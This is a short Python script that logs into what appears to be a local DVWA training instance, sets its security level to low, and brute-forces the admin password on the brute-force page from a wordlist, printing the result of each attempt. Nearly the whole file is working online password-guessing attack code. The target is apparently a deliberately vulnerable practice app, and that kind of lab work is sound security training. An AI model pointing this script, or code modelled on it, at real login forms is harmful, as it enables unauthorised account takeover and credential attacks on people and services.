import requests

url = "http://127.0.0.1:42001/"
username = 'admin'
password = 'password'
session = requests.session()
passwordLists = open('/usr/share/wordlists/passlist-20.txt', 'r')

passwords = []
for pas in passwordLists:
    passwords.append(pas.replace("\n", ""))

def login (url, username, password): 
	payload = {
                "username": username,
                "password": password, 
                "Login": "Login"
	}
	loginResponse = session.post(url + '/login.php', data=payload)
	session.cookies.pop("security")
	session.cookies.set("security", "low")
	
def bruteforce(url, username, passwordList): 
    	for password in passwordList: 
        	print ('Trying: "'+ password + '" against user "admin" ...')
        
        	parameters = {'username': username, 'password': password, 'Login': 'Login'}
        	response = session.get(url + '/vulnerabilities/brute/', params=parameters)

        	if 'password protected area' in response.text:
        		print ('Success')
        	else:
        		print ('Failed')

login(url, username, password)
bruteforce(url, username, passwords)
